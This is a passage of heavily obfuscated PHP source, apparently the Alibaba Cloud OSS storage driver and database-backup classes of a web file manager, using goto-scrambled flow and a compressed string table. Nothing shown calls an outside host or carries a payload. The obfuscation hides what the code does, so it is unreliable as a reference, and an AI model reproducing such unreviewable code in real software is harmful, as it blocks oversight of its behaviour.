$BĞºŒ˜±¥ == $fÑÅ©¶—Ã[34] ? $this->bucketAcl : $BĞºŒ˜±¥; if ($D‡¥‚İŞ  == $fÑÅ©¶—Ã[1194]) { return $fÑÅ©¶—Ã[1193]; } if ($D‡¥‚İŞ  == $fÑÅ©¶—Ã[1195]) { return $fÑÅ©¶—Ã[493]; } goto eÃø¾ö–„; eÃø¾ö–„: return $D‡¥‚İŞ ; goto AÇàçŸŒ†; aáİöãé–: $fÑÅ©¶—Ã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $BĞºŒ˜±¥ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($FªË¸ÏÙ–)); } catch (OSS\Core\OssException $CÚŸŸº—¢½) { return !1; } goto b–ŠæÍéÌ·; AÇàçŸŒ†: } private function chmodPath($Fà©˜À£Š›, $Cê÷ÃÂ¾Ú = '') { $Bµã¦ò›Æˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D¥ÓÃò¶Ò† = empty($Cê÷ÃÂ¾Ú) ? $Bµã¦ò›Æˆ[1195] : $Cê÷ÃÂ¾Ú; $D£ƒ·ÊÛ—ô = array($Bµã¦ò›Æˆ[34], $Bµã¦ò›Æˆ[185], $Bµã¦ò›Æˆ[1194], $Bµã¦ò›Æˆ[1195]); if (!in_array($D¥ÓÃò¶Ò†, $D£ƒ·ÊÛ—ô)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Fà©˜À£Š›), $D¥ÓÃò¶Ò†); } catch (OSS\Core\OssException $E½»½î©™) { return !1; } return !0; } public function getContent($F©âº•„¹ø) { return $this->fileSubstr($F©âº•„¹ø, -1); } public function setContent($eÆĞÓÛ¢ì§, $BÕçàÖÍ³â = '') { $A˜ªòÅ°»å =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; try { $eãè§Ç®‚î = $this->trafficLimit($A˜ªòÅ°»å[1196]); $A´õÄø£äÂ = $this->client->putObject($this->bucket, $this->pathEncode($eÆĞÓÛ¢ì§), $BÕçàÖÍ³â, $eãè§Ç®‚î); } catch (OSS\Core\OssException $Däº¾øßå›) { return !1; } $cñÃêÔöç = array($A˜ªòÅ°»å[1183] => trim($A´õÄø£äÂ[$A˜ªòÅ°»å[1197]], $A˜ªòÅ°»å[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($eÆĞÓÛ¢ì§))); $this->updateObjMeta($eÆĞÓÛ¢ì§, $cñÃêÔöç); return isset($A´õÄø£äÂ[$A˜ªòÅ°»å[1198]][$A˜ªòÅ°»å[1145]]) ? (int) $A´õÄø£äÂ[$A˜ªòÅ°»å[1198]][$A˜ªòÅ°»å[1145]] : strlen($A´õÄø£äÂ); } private function updateObjMeta($C‚’ôŠ©éã, $eòëÑ•º×â) { $C‚’ôŠ©éã = $this->pathEncode($C‚’ôŠ©éã); try { $aªªÃÆŒ‘Ç = array(OSS\OssClient::OSS_HEADERS => $eòëÑ•º×â); $this->client->copyObject($this->bucket, $C‚’ôŠ©éã, $this->bucket, $C‚’ôŠ©éã, $aªªÃÆŒ‘Ç); } catch (OSS\Core\OssException $dÎÇ‚ô‘¸Ó) { return !1; } return !0; } public function upload($eÙÈ²ÌïÃò, $a‡Š›æÉ”—, $a¨È÷Ú‡–Ø = false, $d§‚êø—ª = REPEAT_REPLACE) { $E×ŸáğŠÉ  =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F£µÄ‹õš  = trim($eÙÈ²ÌïÃò, $E×ŸáğŠÉ [8]); $b¿¦ƒ…ìˆè = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($E×ŸáğŠÉ [1183] => @md5_file($a‡Š›æÉ”—)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($eÙÈ²ÌïÃò))); $b¿¦ƒ…ìˆè = $this->trafficLimit($E×ŸáğŠÉ [1196], $b¿¦ƒ…ìˆè); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($F£µÄ‹õš ), $a‡Š›æÉ”—, $b¿¦ƒ…ìˆè); } catch (OSS\Core\OssException $DÂƒ‘æ­±) { return !1; } return $this->getPathOuter($eÙÈ²ÌïÃò); } public function getHost() { $eá‡ÕŠÍô˜ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a¬ß‡‰¾†ê = explode($eá‡ÕŠÍô˜[171], parent::getHost()); return $a¬ß‡‰¾†ê[0] . $eá‡ÕŠÍô˜[171] . $this->bucket . $eá‡ÕŠÍô˜[91] . $a¬ß‡‰¾†ê[1]; } public function uploadFormData($a–˜–Í²±, $f¬Ü¤¹éñÔ = 3600) { goto B¦£è˜•×¸; B¦£è˜•×¸: $F’×’ç˜Íì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!($bÆ„±÷Í†× = $this->getHost())) { return !1; } $b«ßĞòÎšÄ = $f¬Ü¤¹éñÔ; goto A”•š­êÅ; fƒÑ»³Ô•…: $fò†õÌùÏñ = base64_encode(hash_hmac($F’×’ç˜Íì[218], $eè´¤äçê, $this->secret, !0)); $EñœØ…­  = array($F’×’ç˜Íì[1109] => $eè´¤äçê, $F’×’ç˜Íì[1202] => $this->accessKey, $F’×’ç˜Íì[1105] => $F’×’ç˜Íì[1097], $F’×’ç˜Íì[1203] => $fò†õÌùÏñ, $F’×’ç˜Íì[169] => $bÆ„±÷Í†×); $EñœØ…­  = $this->trafficLimit($F’×’ç˜Íì[1196], $EñœØ…­ ); goto EÙã™’¡×œ; A”•š­êÅ: $e´Êäâ¢Ú‹ = date($F’×’ç˜Íì[1199], time() + $b«ßĞòÎšÄ); $b¿óöğäÕ¼ = new DateTime($e´Êäâ¢Ú‹); $B‰ß²Ş†Ş” = $b¿óöğäÕ¼->format(DateTime::ISO8601); goto FìÔíóô¹; FìÔíóô¹: $a¼ØŒ¾¿ã = strpos($B‰ß²Ş†Ş”, $F’×’ç˜Íì[284]); $B‰ß²Ş†Ş” = substr($B‰ß²Ş†Ş”, 0, $a¼ØŒ¾¿ã) . $F’×’ç˜Íì[1200]; $BåİğÄø¯Œ = 1048576000 * 5; goto FçØ¿´‡ß™; EÙã™’¡×œ: return $EñœØ…­ ; goto EËáìÂŠ†ø; FçØ¿´‡ß™: $eÃÓí¬ŞŒ¤ = $this->pathFather($a–˜–Í²±); $föİ¿ĞŞÓ± = array($F’×’ç˜Íì[1099] => $B‰ß²Ş†Ş”, $F’×’ç˜Íì[1100] => array(array($F’×’ç˜Íì[1201], 0, $BåİğÄø¯Œ), array($F’×’ç˜Íì[1103], $F’×’ç˜Íì[1104], $eÃÓí¬ŞŒ¤))); $eè´¤äçê = base64_encode(json_encode($föİ¿ĞŞÓ±)); goto fƒÑ»³Ô•…; EËáìÂŠ†ø: } public function multiUploadFormData($E£»ßÕ á›, $f½ô··ì¬İ = 3600) { $D©”Åæ×Íì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!($F“ôåå¥Ê = $this->getHost())) { return !1; } $cãÀË®Úö² = $this->trafficLimit($D©”Åæ×Íì[1196]); $d´ÔˆÙµ¢ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($E£»ßÕ á›), $cãÀË®Úö²); return array($D©”Åæ×Íì[209] => $d´ÔˆÙµ¢, $D©”Åæ×Íì[169] => $F“ôåå¥Ê . $D©”Åæ×Íì[8] . $this->pathEncode($E£»ßÕ á›), $D©”Åæ×Íì[210] => gmdate($D©”Åæ×Íì[1204]), $D©”Åæ×Íì[89] => $E£»ßÕ á›); } public function multiUploadAuthData($DËÇÖÚç–µ, $aÜÙôÙÚ•´ = array()) { goto E¼­ÙÂ…ËÖ; dˆÜİêç™©: $fÁÉÃ¤½ë¢ = $DËÇÖÚç–µ; if (isset($aÜÙôÙÚ•´[$b”†Ì‘‘®ğ[89]])) { $fÁÉÃ¤½ë¢ = $aÜÙôÙÚ•´[$b”†Ì‘‘®ğ[89]]; unset($aÜÙôÙÚ•´[$b”†Ì‘‘®ğ[89]]); } if (isset($aÜÙôÙÚ•´[$b”†Ì‘‘®ğ[211]])) { $aÜÙôÙÚ•´[$b”†Ì‘‘®ğ[210]] = $A™Íô™ò¾ğ; return $this->listUploadParts($fÁÉÃ¤½ë¢, $aÜÙôÙÚ•´); } goto b»ó…êºèä; E¼­ÙÂ…ËÖ: $b”†Ì‘‘®ğ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A™Íô™ò¾ğ = isset($aÜÙôÙÚ•´[$b”†Ì‘‘®ğ[210]]) ? $aÜÙôÙÚ•´[$b”†Ì‘‘®ğ[210]] : gmdate($b”†Ì‘‘®ğ[1204]); $cª „‘“Üô = isset($aÜÙôÙÚ•´[$b”†Ì‘‘®ğ[160]]) ? $aÜÙôÙÚ•´[$b”†Ì‘‘®ğ[160]] : $b”†Ì‘‘®ğ[33]; goto dˆÜİêç™©; E·­ˆÄ·Ï: $bŸ¶Œ¿İø = $b”†Ì‘‘®ğ[1207] . $this->accessKey . $b”†Ì‘‘®ğ[4] . $BâˆíÈÜÏÚ; if (strpos($cª „‘“Üô, $b”†Ì‘‘®ğ[213]) === 0) { $bŸ¶Œ¿İø = array($b”†Ì‘‘®ğ[220] => $bŸ¶Œ¿İø, $b”†Ì‘‘®ğ[210] => $A™Íô™ò¾ğ); if ($bˆ‰²Á•Ë) { $bŸ¶Œ¿İø = array_merge($bŸ¶Œ¿İø, $bˆ‰²Á•Ë); } } return $bŸ¶Œ¿İø; goto d‘­–î¬š³; b»ó…êºèä: $F´±»£ï†‚ = array($b”†Ì‘‘®ğ[212], $b”†Ì‘‘®ğ[33], $b”†Ì‘‘®ğ[116], $A™Íô™ò¾ğ, "\x78\55\157\x73\x73\55\x64\141\164\x65\x3a{$A™Íô™ò¾ğ}", $b”†Ì‘‘®ğ[8] . $this->bucket . $b”†Ì‘‘®ğ[8] . $fÁÉÃ¤½ë¢ . $cª „‘“Üô); if (strpos($cª „‘“Üô, $b”†Ì‘‘®ğ[213]) === 0) { $F´±»£ï†‚[0] = $b”†Ì‘‘®ğ[214]; if ($bˆ‰²Á•Ë = $this->trafficLimit($b”†Ì‘‘®ğ[1196])) { $fÁÉÃ¤½ë¢ = $b”†Ì‘‘®ğ[1205]; array_splice($F´±»£ï†‚, 5, 0, $fÁÉÃ¤½ë¢ . $b”†Ì‘‘®ğ[4] . $bˆ‰²Á•Ë[$fÁÉÃ¤½ë¢]); } } if (isset($aÜÙôÙÚ•´[$b”†Ì‘‘®ğ[215]]) && $aÜÙôÙÚ•´[$b”†Ì‘‘®ğ[215]] == $b”†Ì‘‘®ğ[216]) { $F´±»£ï†‚[0] = $b”†Ì‘‘®ğ[216]; } goto F°ĞŒ¾ğƒÏ; F°ĞŒ¾ğƒÏ: if (!empty($aÜÙôÙÚ•´[$b”†Ì‘‘®ğ[1206]])) { $bÎöó¹ù³´ = array_merge(array($F´±»£ï†‚[4]), $aÜÙôÙÚ•´[$b”†Ì‘‘®ğ[1206]]); sort($bÎöó¹ù³´); $F´±»£ï†‚[4] = implode($b”†Ì‘‘®ğ[217], $bÎöó¹ù³´); } $CÔŠÂ­ÒÆ¼ = implode($b”†Ì‘‘®ğ[217], $F´±»£ï†‚); $BâˆíÈÜÏÚ = base64_encode(hash_hmac($b”†Ì‘‘®ğ[218], $CÔŠÂ­ÒÆ¼, $this->secret, !0)); goto E·­ˆÄ·Ï; d‘­–î¬š³: } public function listUploadParts($a‹ç·–Òå–, $dŒÔ—¿ã”½) { goto A¦Ùøô¬¼ƒ; A¦Ùøô¬¼ƒ: $fÈ¸Ãç±–“ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d¸ƒÎçœ·Å = parse_url_query($dŒÔ—¿ã”½[$fÈ¸Ãç±–“[160]]); $CÅèğº—Ç = $this->client->listParts($this->bucket, $this->pathEncode($a‹ç·–Òå–), $d¸ƒÎçœ·Å[$fÈ¸Ãç±–“[209]]); goto Böœ‹Ê‚¢¢; DäØø´§äò: unset($dŒÔ—¿ã”½[$fÈ¸Ãç±–“[211]], $dŒÔ—¿ã”½[$fÈ¸Ãç±–“[215]]); $e‚Ÿõß¬ = $this->multiUploadAuthData($a‹ç·–Òå–, $dŒÔ—¿ã”½); if (empty($e‚Ÿõß¬)) { return !1; } goto Cäğ‘ï¦¢™; Cäğ‘ï¦¢™: return array($fÈ¸Ãç±–“[220] => $e‚Ÿõß¬, $fÈ¸Ãç±–“[210] => $dŒÔ—¿ã”½[$fÈ¸Ãç±–“[210]], $fÈ¸Ãç±–“[222] => $fÕùíØ‡‚); goto E¾öØŠ¬â; Böœ‹Ê‚¢¢: $Dâ³ª¿ÉŠÄ = $CÅèğº—Ç->getListPart(); $fÕùíØ‡‚ = array(); foreach ($Dâ³ª¿ÉŠÄ as $bÉÆ¸Ü’Üñ) { $fÕùíØ‡‚[] = array($fÈ¸Ãç±–“[1187] => $bÉÆ¸Ü’Üñ->getPartNumber(), $fÈ¸Ãç±–“[1188] => trim($bÉÆ¸Ü’Üñ->getETag(), $fÈ¸Ãç±–“[113])); } goto DäØø´§äò; E¾öØŠ¬â: } public function download($A‹¸óœ¸‰ë, $aáÁ°¸ˆÃŠ) { if ($this->isFolder($A‹¸óœ¸‰ë)) { return !1; } try { $C¯ƒ½«õ…¶ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $aáÁ°¸ˆÃŠ); $C¯ƒ½«õ…¶ = $this->trafficLimit($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][105], $C¯ƒ½«õ…¶); $this->client->getObject($this->bucket, $this->pathEncode($A‹¸óœ¸‰ë), $C¯ƒ½«õ…¶); } catch (OSS\Core\OssException $cœôğ™Ì¢ñ) { return !1; } return $aáÁ°¸ˆÃŠ; } public function fileSubstr($e…£›‡³Û, $Aá‰ˆƒ¦ = 0, $fšî‘™³¯ = false) { if ($Aá‰ˆƒ¦ === -1) { $dÀªêñ×² = array(); } else { if ($fšî‘™³¯ === !1) { $aßá‰İ‰àË = $this->size($e…£›‡³Û); } else { $aßá‰İ‰àË = $Aá‰ˆƒ¦ + $fšî‘™³¯ - 1; } $dÀªêñ×² = array(OSS\OssClient::OSS_RANGE => "{$Aá‰ˆƒ¦}\x2d{$aßá‰İ‰àË}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($e…£›‡³Û), $dÀªêñ×²); } catch (OSS\Core\OssException $BÓ××˜÷÷) { think_exception($BÓ××˜÷÷->getMessage()); return !1; } } private function trafficLimit($Cëß…‘¦Ï«, $fÕ§¼Š¡íÙ = array()) { goto B«ËÌâÆÚ; eÏàÔ—¸ùº: if (!$b¨§ŸÖ’‹È) { return $fÕ§¼Š¡íÙ; } $b¨§ŸÖ’‹È = $b¨§ŸÖ’‹È < 819200 ? 819200 : ($b¨§ŸÖ’‹È > 838860800 ? 838860800 : $b¨§ŸÖ’‹È); $fÕ§¼Š¡íÙ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($b¨§ŸÖ’‹È); goto c³Ş³‚äÊ¹; c³Ş³‚äÊ¹: return $fÕ§¼Š¡íÙ; goto Dâ§È‰ŸÚ®; B«ËÌâÆÚ: $fºÙõ¦ƒä§ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($Cëß…‘¦Ï« == $fºÙõ¦ƒä§[1196] && $this->isUploadServer() || $Cëß…‘¦Ï« == $fºÙõ¦ƒä§[105] && $this->isFileOutServer()) { return $fÕ§¼Š¡íÙ; } $b¨§ŸÖ’‹È = floatval($GLOBALS[$fºÙõ¦ƒä§[6]][$fºÙõ¦ƒä§[84]][$fºÙõ¦ƒä§[103]][$Cëß…‘¦Ï«]) * 1024 * 1024 * 8; goto eÏàÔ—¸ùº; Dâ§È‰ŸÚ®: } public function link($D®à¸¡•à¹, $Fˆ•…ôÒê = array()) { $aá´ ‘øˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->exist($D®à¸¡•à¹) || $this->isFolder($D®à¸¡•à¹)) { return !1; } try { $Fˆ•…ôÒê = $this->trafficLimit($aá´ ‘øˆ[105], $Fˆ•…ôÒê); $Bˆ¦ŠßÎæÃ = $this->client->signUrl($this->bucket, $this->pathEncode($D®à¸¡•à¹), 3600 * 12, $aá´ ‘øˆ[216], $Fˆ•…ôÒê); return $this->getCdnLink($Bˆ¦ŠßÎæÃ); } catch (OSS\Core\OssException $BèõŠô†ô™) { return !1; } } public function fileOut($Dê·á¥íó„, $fîªñì­ = false, $Eîõ¯ÁÆê = false, $c˜ÍÁƒä¬ = '') { goto dÓ†‹ê«‡ˆ; C–Äñè›Ü: $fîªñì­ = $fîªñì­ ? $f·ª£¥é‡[202] : $f·ª£¥é‡[203]; $bÀ¢Ú”ÖÀ¦ = array(OSS\OssClient::OSS_SUB_RESOURCE => $f·ª£¥é‡[1208] . rawurlencode("{$fîªñì­}\x3b\146\151\x6c\x65\x6e\141\155\x65\x3d{$Eîõ¯ÁÆê}")); $bÀ¢Ú”ÖÀ¦[OSS\OssClient::OSS_SUB_RESOURCE] .= $f·ª£¥é‡[1209] . rawurlencode($cÙíÏ‘Îê); goto F±ÌÄµò¨æ; dà•¬ĞŒµ: $Eîõ¯ÁÆê = rawurlencode($Eîõ¯ÁÆê); $cÙíÏ‘Îê = get_file_mime(get_path_ext($Eîõ¯ÁÆê)); if ($cÙíÏ‘Îê == $f·ª£¥é‡[201]) { return parent::fileOut($Dê·á¥íó„, $fîªñì­, $Eîõ¯ÁÆê, $c˜ÍÁƒä¬); } goto C–Äñè›Ü; F±ÌÄµò¨æ: $dÀÄ³´ë‚ñ = $this->link($Dê·á¥íó„, $bÀ¢Ú”ÖÀ¦); $this->fileOutLink($dÀÄ³´ë‚ñ); goto dñ•§œª×Ê; dÓ†‹ê«‡ˆ: $f·ª£¥é‡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Dê·á¥íó„, $fîªñì­, $Eîõ¯ÁÆê, $c˜ÍÁƒä¬); } if (!$Eîõ¯ÁÆê) { $Eîõ¯ÁÆê = $this->pathThis($Dê·á¥íó„); } goto dà•¬ĞŒµ; dñ•§œª×Ê: } public function fileOutServer($B…»‚£ùà‰, $EÆ¼–ššÆ = false, $d£ÚØ‡Èƒ = false, $AÈêàè¸Û” = '') { parent::fileOut($B…»‚£ùà‰, $EÆ¼–ššÆ, $d£ÚØ‡Èƒ, $AÈêàè¸Û”); } public function fileOutImage($C—ËƒØÅ, $DÄªëÈ»È = 250) { $aÎ‘ÍİØö = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1210] . $DÄªëÈ»È); $Dö§ŠÁ¥ËÏ = $this->link($C—ËƒØÅ, $aÎ‘ÍİØö); $this->fileOutLink($Dö§ŠÁ¥ËÏ); } public function fileOutImageServer($FŠ™’Äóë†, $aÃ‘ˆ°ç­Î = 250) { parent::fileOutImage($FŠ™’Äóë†, $aÃ‘ˆ°ç­Î); } public function fileOutLink($e¿¾Êğ‚ª) { $C±±‘»Å÷ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->isCdnHost() && substr($e¿¾Êğ‚ª, 0, 7) == $C±±‘»Å÷[1112]) { $e¿¾Êğ‚ª = $C±±‘»Å÷[1113] . substr($e¿¾Êğ‚ª, 7); } header($C±±‘»Å÷[156] . $e¿¾Êğ‚ª); die; } public function hashMd5($aÁµÎØîó, $FÎ ÚÎÕÚŸ = '') { $fÛ„’í„Ÿ† =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EÊÑ†³ô© = $this->objectMeta($aÁµÎØîó); if (!$EÊÑ†³ô©) { return $fÛ„’í„Ÿ†[33]; } if (!isset($EÊÑ†³ô©[$fÛ„’í„Ÿ†[1183]]) && !empty($FÎ ÚÎÕÚŸ)) { $f®¾ƒĞŸ—Ç = $this->updateObjMeta($aÁµÎØîó, array($fÛ„’í„Ÿ†[1183] => $FÎ ÚÎÕÚŸ)); $EÊÑ†³ô©[$fÛ„’í„Ÿ†[1183]] = $f®¾ƒĞŸ—Ç ? $FÎ ÚÎÕÚŸ : $fÛ„’í„Ÿ†[33]; } return isset($EÊÑ†³ô©[$fÛ„’í„Ÿ†[1183]]) ? strtolower($EÊÑ†³ô©[$fÛ„’í„Ÿ†[1183]]) : $fÛ„’í„Ÿ†[33]; } public function size($C¥®¦¾¦ÎÛ) { $C›„ÅÕ…¢ = $this->objectMeta($C¥®¦¾¦ÎÛ); return $C›„ÅÕ…¢ ? $C›„ÅÕ…¢[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][77]] : 0; } public function info($cÄ“è¦™öç) { if ($this->isFolder($cÄ“è¦™öç)) { return $this->folderInfo($cÄ“è¦™öç); } else { if ($this->isFile($cÄ“è¦™öç)) { return $this->fileInfo($cÄ“è¦™öç); } } return !1; } public function exist($AŒŸ‚›Î¼) { return $this->isFile($AŒŸ‚›Î¼) || $this->isFolder($AŒŸ‚›Î¼); } public function isFile($FÒ½Ğ–Âø) { return !$this->isFolder($FÒ½Ğ–Âø) && $this->objectMeta($FÒ½Ğ–Âø); } public function isFolder($b‹Êœƒ’œ) { return $this->cacheMethod($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][223], $b‹Êœƒ’œ); } protected function objectMeta($c˜¿áŠ‘¼) { return $this->cacheMethod($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][224], $c˜¿áŠ‘¼); } protected function _objectMeta($EŸŞ„ñß‚) { $c³‚•ÂÈ¶ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; try { $f„ìŒÛ”ôÖ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($EŸŞ„ñß‚)); } catch (OSS\Core\OssException $a«ÍŒ ˆÜç) { $f„ìŒÛ”ôÖ = !1; } if ($f„ìŒÛ”ôÖ) { $f„ìŒÛ”ôÖ[$c³‚•ÂÈ¶[77]] = intval($f„ìŒÛ”ôÖ[$c³‚•ÂÈ¶[1190]]); } return $f„ìŒÛ”ôÖ; } protected function _isFolder($FŒà•ãŞ‹‹) { $B…¤ùñÀº¢ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($FŒà•ãŞ‹‹ == $B…¤ùñÀº¢[33] || $FŒà•ãŞ‹‹ == $B…¤ùñÀº¢[8]) { return !0; } $AäšŒ±Å– = array($B…¤ùñÀº¢[1180] => $B…¤ùñÀº¢[8], $B…¤ùñÀº¢[186] => rtrim($FŒà•ãŞ‹‹, $B…¤ùñÀº¢[8]) . $B…¤ùñÀº¢[8], $B…¤ùñÀº¢[1181] => 1, $B…¤ùñÀº¢[1182] => $B…¤ùñÀº¢[33]); $DøèÔŸ“ˆ÷ = $this->client->listObjects($this->bucket, $AäšŒ±Å–); if ($DøèÔŸ“ˆ÷->getObjectList() || $DøèÔŸ“ˆ÷->getPrefixList()) { return !0; } return !1; } } goto Bã«Ø¨„; e¬İ›®È–Å: define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][0], $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1]); $_SERVER[¡Áã] = explode($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2], gzinflate(substr($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][3], 10, -8))); function Model($FÓË“‹¸¸Ú = '', $bÔã¯í×ë = '', $aöçñèØ§­ = '') { goto aôƒê×Åå; AÜÒˆñø®­: $cÖãã£íÊã[$FéŞ¹æ‚‹Ì] = new ModelBase($FÓË“‹¸¸Ú, $bÔã¯í×ë, $aöçñèØ§­); return $cÖãã£íÊã[$FéŞ¹æ‚‹Ì]; goto EÌíÓ´¸ƒ½; aôƒê×Åå: $FËµğÆçŠ£ =& $_SERVER[¡Áã]; static $cÖãã£íÊã = array(); $FéŞ¹æ‚‹Ì = strtolower($bÔã¯í×ë . $FËµğÆçŠ£[0] . $FÓË“‹¸¸Ú); goto fî… ˜¼; fî… ˜¼: if (isset($cÖãã£íÊã[$FéŞ¹æ‚‹Ì])) { return $cÖãã£íÊã[$FéŞ¹æ‚‹Ì]; } if ($FÓË“‹¸¸Ú) { $FÓË“‹¸¸Ú = strtoupper($FÓË“‹¸¸Ú[0]) . substr($FÓË“‹¸¸Ú, 1); $CÚÌÅ•‹É‡ = $FÓË“‹¸¸Ú . $FËµğÆçŠ£[1]; if (class_exists($CÚÌÅ•‹É‡)) { $cÖãã£íÊã[$FéŞ¹æ‚‹Ì] = new $CÚÌÅ•‹É‡(); return $cÖãã£íÊã[$FéŞ¹æ‚‹Ì]; } } if (!$aöçñèØ§­) { $aöçñèØ§­ = $GLOBALS[$FËµğÆçŠ£[2]][$FËµğÆçŠ£[3]]; } goto AÜÒˆñø®­; EÌíÓ´¸ƒ½: } goto B¯ÙÙÙĞ¤; cè¬…‘°Ë: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto FÛà¯ºî”±; aÀƒÖÆ§…¥: $BˆˆîÍ¦‹ = new DbManage($D •½Ûˆñİ, $eÌÉŒ³†Œ); $aíŒŞµ«è = TEMP_FILES . $f®Ò×Ûã™„[711] . self::$name . $f®Ò×Ûã™„[8]; del_dir($aíŒŞµ«è); goto c¹‚Ì†°ÛÅ; b°‚¢›–‘À: $DÖ‹†İ‰Ùö = array_diff($DÖ‹†İ‰Ùö, array($f®Ò×Ûã™„[712], $f®Ò×Ûã™„[713])); foreach ($DÖ‹†İ‰Ùö as $D¼õÎĞéÙà) { $Aä„¤ŸÄÀ += $BˆˆîÍ¦‹->model($D¼õÎĞéÙà)->count(); } $E¬å³ß´‰ç = new Task($f®Ò×Ûã™„[714], $f®Ò×Ûã™„[715], $Aä„¤ŸÄÀ, LNG($f®Ò×Ûã™„[716]) . $f®Ò×Ûã™„[717] . LNG($f®Ò×Ûã™„[718])); goto e±ºİÉ‡Ë÷; c¹‚Ì†°ÛÅ: mk_dir($aíŒŞµ«è); $Aä„¤ŸÄÀ = $AìË±À²à = 0; $DÖ‹†İ‰Ùö = $BˆˆîÍ¦‹->db()->getTables(); goto b°‚¢›–‘À; FœŠõº”Îá: Backup::set($c‘¡Ë™²„¦); return !0; goto aäîÊ•İÄ; E•¯²çà«—: self::$name = $Bƒ›»ì¸©[$f®Ò×Ûã™„[28]]; $D •½Ûˆñİ = $GLOBALS[$f®Ò×Ûã™„[6]][$f®Ò×Ûã™„[17]]; $eÌÉŒ³†Œ = $this->_dbType($D •½Ûˆñİ); goto aÀƒÖÆ§…¥; e±ºİÉ‡Ë÷: foreach ($DÖ‹†İ‰Ùö as $D¼õÎĞéÙà) { $F†‡Ã’•ÌØ = $aíŒŞµ«è . $D¼õÎĞéÙà . $f®Ò×Ûã™„[719]; $c—œëñ»íí = null; if ($D¼õÎĞéÙà == $f®Ò×Ûã™„[720] && (!isset($Bƒ›»ì¸©[$f®Ò×Ûã™„[686]]) || $Bƒ›»ì¸©[$f®Ò×Ûã™„[686]] == $f®Ò×Ûã™„[470])) { $c—œëñ»íí = self::$io; } $AìË±À²à += $BˆˆîÍ¦‹->sqlFromDb($D¼õÎĞéÙà, $F†‡Ã’•ÌØ, $E¬å³ß´‰ç, $c—œëñ»íí); } $E¬å³ß´‰ç->end(); $c‘¡Ë™²„¦ = array($f®Ò×Ûã™„[721] => $eÌÉŒ³†Œ, $f®Ò×Ûã™„[700] => 1, $f®Ò×Ûã™„[722] => $AìË±À²à, $f®Ò×Ûã™„[723] => $AìË±À²à); goto FœŠõº”Îá; FÛà¯ºî”±: $f®Ò×Ûã™„ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Bƒ›»ì¸© = Backup::get(); self::$io = $Bƒ›»ì¸©[$f®Ò×Ûã™„[685]]; goto E•¯²çà«—; aäîÊ•İÄ: } private function _dbType($Eä·¿Ä—ƒ) { goto C…†ë‘º«†; bƒÃ’…ªˆ’: return $dì¾ƒÍÀÃÊ; goto cÅóÎæÅğ÷; C…†ë‘º«†: $A”‹ğÛ‚Ä„ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Eä·¿Ä—ƒ = array_change_key_case($Eä·¿Ä—ƒ); $dì¾ƒÍÀÃÊ = $Eä·¿Ä—ƒ[$A”‹ğÛ‚Ä„[724]]; goto FÜ÷¥•ÀÚ”; FÜ÷¥•ÀÚ”: if ($dì¾ƒÍÀÃÊ == $A”‹ğÛ‚Ä„[725]) { $e²§½†§Ó = explode($A”‹ğÛ‚Ä„[4], $Eä·¿Ä—ƒ[$A”‹ğÛ‚Ä„[726]]); $dì¾ƒÍÀÃÊ = $e²§½†§Ó[0]; } $açâ‘„øëè = array($A”‹ğÛ‚Ä„[727] => $A”‹ğÛ‚Ä„[9], $A”‹ğÛ‚Ä„[728] => $A”‹ğÛ‚Ä„[729]); if (isset($açâ‘„øëè[$dì¾ƒÍÀÃÊ])) { $dì¾ƒÍÀÃÊ = $açâ‘„øëè[$dì¾ƒÍÀÃÊ]; } goto bƒÃ’…ªˆ’; cÅóÎæÅğ÷: } } class BackupDbFile { public function __construct() { } public function index() { goto B¥ª­¢´„í; C”Ó‘äë‘: $aØª½¤Èàò = TEMP_FILES . "\x62\141\x63\153\x75\160\x5f{$EÕø„£ÑÕÕ}\x2f"; $FœàÒšÜÛ = "\x7b\x69\157\72{$d¢À„‚Š¸Ü[$fÒÂ™—¤›ƒ[685]]}\x7d\57\144\x61\164\x61\142\141\x73\x65\x2f"; IO::mkdir($FœàÒšÜÛ . 